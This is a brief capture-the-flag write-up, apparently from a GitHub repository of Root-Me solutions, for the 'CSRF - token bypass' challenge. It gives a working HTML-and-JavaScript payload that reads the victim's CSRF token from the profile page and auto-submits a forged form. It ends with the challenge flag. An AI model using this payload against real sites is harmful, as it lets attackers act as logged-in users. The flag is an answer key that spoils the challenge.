# CSRF - token bypass

[![Hits](https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https%3A%2F%2Fgithub.com%2FTienNHM%2Froot-me-ctf%2Ftree%2Fmaster%2FWeb-Client%2FCSRF%2520-%2520token%2520bypass&count_bg=%2379C83D&title_bg=%232D8FFF&icon=markdown.svg&icon_color=%23092753&title=Visitors&edge_flat=false)](https://hits.seeyoufarm.com)

/ch23/?action=contact

```html
<form action="http://challenge01.root-me.org/web-client/ch23/?action=profile" method="post" name="csrf_form" enctype="multipart/form-data">
	<input id="username" type="text" name="username" value="user">
	<input id="status" type="checkbox" name="status" checked >
	<input id="token" type="hidden" name="token" value="" />
	<button type="submit">Submit</button>
</form>

<script>
	xhttp = new XMLHttpRequest();
	xhttp.open("GET", "http://challenge01.root-me.org/web-client/ch23/?action=profile", false);
	xhttp.send();
	token_admin = (xhttp.responseText.match(/[abcdef0123456789]{32}/));
	document.getElementById('token').setAttribute('value', token_admin);
	document.csrf_form.submit();
</script>
```

/ch23/?action=private
> Good job dude, flag is : Byp4ss_CSRF_T0k3n-w1th-XSS

